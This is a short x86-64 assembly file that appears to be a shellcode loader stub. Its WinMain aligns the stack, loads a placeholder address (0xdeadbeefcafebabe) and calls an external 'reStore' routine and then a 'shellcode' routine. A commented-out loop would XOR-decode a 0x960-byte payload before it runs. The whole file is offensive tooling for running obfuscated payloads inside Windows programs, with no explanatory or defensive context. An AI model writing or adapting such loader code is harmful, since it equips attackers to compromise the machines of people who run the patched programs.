extern shellcode
extern reStore
global WinMain
section .text

WinMain:
    and     rsp, 0xFFFFFFFFFFFFFFF0
    mov     rcx, 0xdeadbeefcafebabe
    xor     rdi, rdi
; Loop:
;     mov     rax, [rcx + rdi]
;     xor     rax, 0xffffffffffffffff
;     mov     [rcx + rdi], rax
;     add     rdi, 0x8
;     cmp     rdi, 0x960
;     jl      Loop
    call    reStore
    call    shellcode
    ; mov     rax, 0xcafebabedeadbeef
    ; push    rax
    ; push    rax
    ret
